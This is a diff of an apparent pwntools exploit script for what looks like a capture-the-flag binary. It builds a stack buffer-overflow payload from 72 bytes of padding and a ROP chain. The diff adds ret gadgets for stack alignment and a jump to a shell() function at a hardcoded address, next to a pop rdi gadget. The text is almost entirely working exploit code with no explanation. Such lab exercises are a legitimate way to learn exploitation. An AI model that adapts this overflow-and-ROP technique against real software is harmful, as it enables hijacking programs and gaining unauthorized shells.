@@ -17,17 +17,15 @@ else:
 ### Payload #########################################################
 contact = b"A"*64 # Padding for the variable contact
 padding = b"A"*8 # Bruteforce the requred extra padding before it doesn't crash
-#padding = p64(0xDEADBEEF)
-#payload += b"A"*16
 
 ## ROP Gadgets
 ropchain = b""
-#ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
+ropchain += p64(0x00000000004006ea) # shell()
 ropchain += p64(0x0000000000400873) #pop rdi; ret
 ropchain += p64(0xDEADBEEF)
 ropchain += p64(0x00000000004006ea) # shell()
-#ropchain += p64(0x7ffff7e21120)# system command
-
 
 payload = contact + padding + ropchain
 
